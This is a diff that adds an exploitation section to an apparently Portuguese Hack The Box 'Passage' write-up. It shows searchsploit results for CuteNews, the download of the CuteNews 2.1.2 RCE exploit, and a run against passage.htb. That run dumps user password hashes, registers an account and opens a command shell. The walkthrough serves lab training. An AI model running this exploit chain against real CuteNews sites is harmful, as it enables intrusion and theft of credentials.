@@ -71,6 +71,88 @@ Ao acessar a aplicação web, no canto inferior do site é possível notar uma i
 
 ![Sem título2.png](/assets/img/sample/Passage2.png)
 
-`https://cutephp.com/`
+
+CMS: `https://cutephp.com/`
+
+A partir da descoberta do CMS, é possível pesquisar exploits referentes a ele.
+
+```terminal
+$ searchsploit cute php remote
+
+CuteNews 0.88 - 'comments.php' Remote File Inclusion
+CuteNews 0.88 - 'search.php' Remote File Inclusion
+CuteNews 0.88 - 'shownews.php' Remote File Inclusion
+CuteNews 1.1.1 - 'html.php' Remote Code Execution 
+CuteNews 1.4.0 - Shell Injection / Remote Command Execution
+CuteNews 1.4.1 - 'categories.mdu' Remote Command Execution  
+CuteNews 1.4.1 - Shell Injection / Remote Command Execution 
+CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)
+CuteNews 2.1.2 - Remote Code Execution 
+CuteNews aj-fork - 'path' Remote File Inclusion
+CuteNews aj-fork 167f - 'cutepath' Remote File Inclusion
+```
+
+O Exploit que será utilizado é o CuteNews 2.1.2 - Remote Code Execution | php/webapps/48800.py
+
+`https://www.exploit-db.com/exploits/48800`
+
+```terminal
+$ searchsploit -m 48800
+```
+
+## Exploitation 
+
+Após baixar o exploit, basta executá-lo
+
+```terminal
+$ python3 48800.py
+
+           _____     __      _  __                     ___   ___  ___
+          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
+         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
+         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
+                                ___  _________
+                               / _ \/ ___/ __/
+                              / , _/ /__/ _/
+                             /_/|_|\___/___/
+
+
+
+
+[->] Usage python3 expoit.py
+
+Enter the URL> http://passage.htb/
+
+================================================================
+Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
+================================================================
+7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
+4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd
+f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
+4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc
+================================================================
+
+=============================
+Registering a users
+=============================
+[+] Registration successful with username: M9nCw3HMKX and password: M9nCw3HMKX
+
+=======================================================
+Sending Payload
+=======================================================
+signature_key: 3a888bb1d42e1ccdf617b140ebed5d26-M9nCw3HMKX
+signature_dsi: 07be6b75ad23b596c739ed786aa021ca
+logged in user: M9nCw3HMKX
+============================
+Dropping to a SHELL
+============================
+
+command >
+```
+
+![]({{site.baseurl}}/https://media.makeameme.org/created/rce-rce-everywhere.jpg)
+
+Pegamos a shell 
 
 
